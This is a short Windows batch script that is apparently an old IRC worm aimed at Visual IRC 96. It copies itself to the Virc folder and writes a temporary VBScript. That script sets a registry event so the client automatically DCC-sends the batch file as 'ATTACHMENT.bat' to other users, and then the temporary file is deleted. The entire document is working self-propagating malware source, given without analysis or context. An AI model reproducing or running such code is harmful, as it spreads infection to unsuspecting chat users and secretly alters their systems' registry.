copy %0 C:\Virc\ATTACHMENT.bat
copy %0 xrwek.vbs
echo.on error resume next >xrwek.vbs
echo set ws = CreateObject("wscript.shell") >> xrwek.vbs
set vircA=MeGaLiTh
echo ws.regwrite "HKEY_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17","dcc send $nick C:\Virc\ATTACHMENT.bat " >>xrwek.vbs
cscript xrwek.vbs
del xrwek.vbs
